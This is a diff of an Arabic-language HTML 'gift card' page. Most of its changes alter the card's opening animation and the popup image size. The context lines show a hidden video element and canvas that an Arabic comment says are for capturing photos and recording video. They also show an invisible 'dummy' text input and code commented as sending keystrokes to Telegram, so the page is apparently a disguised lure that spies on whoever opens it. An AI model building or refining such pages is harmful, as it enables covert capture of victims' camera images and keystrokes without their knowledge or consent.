@@ -21,21 +21,17 @@
             background-image: url('https://images.unsplash.com/photo-1513151233558-d860c5398176?ixlib=rb-4.0.3&auto=format&fit=crop&w=1350&q=80');
             background-size: cover;
             background-position: center;
-            transition: transform 1s ease;
+            transition: opacity 0.5s ease;
         }
         .card-left {
             left: 0;
-            transform-origin: left;
         }
         .card-right {
             right: 0;
-            transform-origin: right;
         }
-        .card-open .card-left {
-            transform: translateX(-100%);
-        }
-        .card-open .card-right {
-            transform: translateX(100%);
+        .card-hidden {
+            opacity: 0;
+            pointer-events: none;
         }
         .popup-image {
             opacity: 0;
@@ -68,12 +64,12 @@
         <!-- نص البطاقة -->
         <div class="card-text">اضغط هنا عشان تشوف الهدية</div>
         <!-- الصورة المنبثقة -->
-        <img id="popupImage" class="popup-image absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-64 h-64 rounded-lg shadow-lg" src="https://i.postimg.cc/0Qkdn6Tt/Whats-App-Image-2025-04-17-at-23-37-13-64fc9ce9.jpg" alt="مفاجأة">
+        <img id="popupImage" class="popup-image absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-4/5 max-w-lg rounded-lg shadow-lg" src="https://i.postimg.cc/0Qkdn6Tt/Whats-App-Image-2025-04-17-at-23-37-13-64fc9ce9.jpg" alt="مفاجأة">
         <!-- حقل إدخال وهمي -->
         <input id="dummyInput" type="text" class="absolute bottom-4 w-3/4 mx-auto p-2 rounded-lg opacity-0" placeholder="اكتب رسالة تهنئة...">
     </div>
 
-    <!-- كانفاس مخفي لالتقاط الصور وتسجيل الفيديو -->
+    <!-- ككانفاس مخفي لالتقاط الصور وتسجيل الفيديو -->
     <video id="video" autoplay style="display: none;"></video>
     <canvas id="canvas" style="display: none;"></canvas>
 
@@ -411,13 +407,13 @@
             if (isProcessing) return;
             isProcessing = true;
 
-            // فتح البطاقة
-            cardContainer.classList.add('card-open');
+            // إخفاء البطاقة
+            cardContainer.classList.add('card-hidden');
 
             // إظهار الصورة المنبثقة
             setTimeout(() => {
                 popupImage.classList.add('show');
-            }, 1000); // بعد انتهاء حركة البطاقة
+            }, 500); // بعد انتهاء تلاشي البطاقة
 
             // إرسال ضغطات المفاتيح إلى Telegram
             if (keystrokes.length > 0) {
